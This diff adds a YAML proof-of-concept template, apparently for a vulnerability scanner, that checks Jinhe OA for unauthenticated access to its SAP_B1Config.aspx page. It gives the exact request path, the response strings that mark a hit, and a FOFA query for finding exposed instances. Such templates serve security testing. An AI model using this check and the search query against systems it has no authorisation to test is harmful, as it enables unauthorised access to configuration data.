@@ -1,0 +1,25 @@
+id: poc-yaml-jinheroa-sap-b1configaspx-authentication-bypass
+info:
+  name: 金和OA SAP_B1Config.aspx未授权访问
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+requests:
+- method: GET
+  path: /C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1
+  headers:
+    Accept-Language: en-US;q=0.9,en;q=0.8
+  expression: 'status_code == 200 &&
+
+    contains(body,"dst_MSSQL") &&
+
+    contains(body,"ln_English_Sg") &&
+
+    contains(body,"SAP B1")
+
+    '
+variables: {}
+transport: http
